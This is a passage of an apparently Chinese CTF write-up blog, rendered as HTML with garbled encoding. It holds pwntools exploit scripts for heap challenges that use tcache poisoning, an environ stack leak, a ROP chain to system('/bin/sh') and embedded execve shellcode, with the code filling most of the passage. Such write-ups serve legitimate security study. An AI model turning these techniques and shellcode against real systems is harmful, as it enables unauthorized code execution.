class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><br><br><br>one_gadget = [<span class="hljs-number">0xda861</span>, <span class="hljs-number">0xda864</span>, <span class="hljs-number">0xda867</span>]<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xda861 execve(&quot;/bin/sh&quot;, r13, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r13] == NULL || r13 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xda864 execve(&quot;/bin/sh&quot;, r13, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r13] == NULL || r13 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xda867 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># leak libc</span><br>show(<span class="hljs-number">0</span>)<br>sh.recv()<br>fd = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = fd - <span class="hljs-number">0x1f2cc0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>one_gadget = libc_base + one_gadget[<span class="hljs-number">1</span>]<br>jump = libc_base + <span class="hljs-number">0x1f4560</span><br>jump = jump + <span class="hljs-number">0x60</span><br>stdout = libc_base + <span class="hljs-number">0x1f3760</span><br>lg(<span class="hljs-string">&#x27;jump&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;stdout&#x27;</span>)<br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add() <span class="hljs-comment"># 8 - 13</span><br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ jump<br><br><span class="hljs-comment"># change _IO_doallocbuf</span><br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>payload = <span class="hljs-number">2</span> * p64(one_gadget)<br>edit(<span class="hljs-number">0x10</span>, <span class="hljs-number">15</span>, payload)<br><br><span class="hljs-comment"># flush struct_stdout</span><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">9</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ stdout<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 16</span><br>add() <span class="hljs-comment"># 17</span><br>edit(<span class="hljs-number">0x40</span>, <span class="hljs-number">17</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="å †æ ˆç»“åˆ-åˆ©ç”¨environ"><a href="#å †æ ˆç»“åˆ-åˆ©ç”¨environ" class="headerlink" title="å †æ ˆç»“åˆ(åˆ©ç”¨environ)"></a>å †æ ˆç»“åˆ(åˆ©ç”¨environ)</h3><p>åˆ©ç”¨environæ³„éœ²å‡ºæ ˆåœ°å€ï¼Œå†åˆ†é…å †å—æ„é€ ropé“¾ã€‚æ³¨æ„glibc2.23ä¹‹åå¯¹åˆ†é…çš„å †åœ°å€è¿›è¡Œäº†æ£€æŸ¥ï¼Œå¿…é¡»æ˜¯0x10å¯¹é½ï¼›è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯ï¼Œé¢˜ç›®ä¸­çš„editå‡½æ•°å’Œaddå‡½æ•°çš„è¿”å›åœ°å€ä¸ºåŒä¸€ä¸ªåœ°å€ï¼Œæ‰€ä»¥åœ¨åˆ†é…fake_chunkçš„æ—¶å€™è¦æ³¨æ„ä¸èƒ½ç›´æ¥å°†å †å—åˆ†é…åœ¨è¿”å›åœ°å€é™„è¿‘ï¼Œå¦åˆ™ä¼šé€ æˆè¿”å›åœ°å€çš„æ¸…ç©ºï¼Œç¨‹åºæŠ¥é”™ï¼›è¿˜æœ‰ä¸€ç‚¹ï¼Œeditçš„å­å‡½æ•°ä¸ä¼šå¯¹canaryè¿›è¡Œæ£€æŸ¥ã€‚</p><p>WPå¦‚ä¸‹ï¼š</p><blockquote><p>æç¤ºï¼šæœ¬äººç”¨çš„libcä¸æ˜¯æ¯”èµ›ç»™çš„libcï¼Œæ˜¯glibc-all-in-oneé‡Œé¢çš„2.34-0ubuntu3_amd64ï¼Œå¿˜è®°æ”¹å›æ¥äº†ï¼Œæ‰€ä»¥wpé‡Œçš„åç§»ä¸èƒ½é€‚ç”¨äºåŸé¢˜ã€‚â”­â”®ï¹â”­â”®</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = elf.libc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># leak libc</span><br>show(<span class="hljs-number">0</span>)<br>sh.recv()<br>fd = uu64()<br>libc_base = fd - <span class="hljs-number">0x218cc0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>system = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>environ = libc_base + libc.symbols[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002e6c5</span><br>ret = libc_base + <span class="hljs-number">0x000000000002d9b9</span><br>lg(<span class="hljs-string">&#x27;environ&#x27;</span>)<br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add()<br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ environ<br><br><span class="hljs-comment"># leak stack</span><br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>show(<span class="hljs-number">15</span>)<br>sh.recv()<br>leak_stack = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak_stack&#x27;</span>)<br>fake_addr = leak_stack - <span class="hljs-number">0x168</span><br><br><span class="hljs-comment"># make rop</span><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">9</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ fake_addr<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, p64(fake_next))<br>add()<br>add()<br><span class="hljs-comment"># dbg()</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)<br>edit(<span class="hljs-number">0x38</span>, <span class="hljs-number">17</span>, payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="bigduck"><a href="#bigduck" class="headerlink" title="bigduck"></a>bigduck</h2><p>è¿™é“é¢˜æ˜¯ä¸Šä¸€é“é¢˜çš„è¿›é˜¶ï¼Œå¼€å¯äº†æ²™ç›’ç¦ç”¨äº†execveï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ç”¨orwæ¥è§£å†³é—®é¢˜ï¼Œå­¦ä¹ ä¸¤ç§æ–¹æ³•ã€‚</p><h3 id="å †æ ˆç»“åˆ-åˆ©ç”¨environ-1"><a href="#å †æ ˆç»“åˆ-åˆ©ç”¨environ-1" class="headerlink" title="å †æ ˆç»“åˆ(åˆ©ç”¨environ)"></a>å †æ ˆç»“åˆ(åˆ©ç”¨environ)</h3><p>æ³¨æ„ä¸€ä¸ªå‘ï¼Œåœ¨æ³„éœ²libcçš„æ—¶å€™ï¼Œfdçš„ä½ä½ä¸º\x00ï¼Œæ— æ³•æ³„éœ²fdï¼Œé€‰æ‹©è¦†ç›–fdç›´è‡³bkçš„ä½ä½ä¸€ä¸ªå­—èŠ‚ï¼Œæ³„éœ²bkã€‚</p><blockquote><p>æ‰“æ¯”èµ›çš„æ—¶å€™è¸©å‘äº†â”­â”®ï¹â”­â”®</p><p>è„šæœ¬å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œä¸‹å‘¨æ”¹ä¸€ä¸‹</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> environ<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span 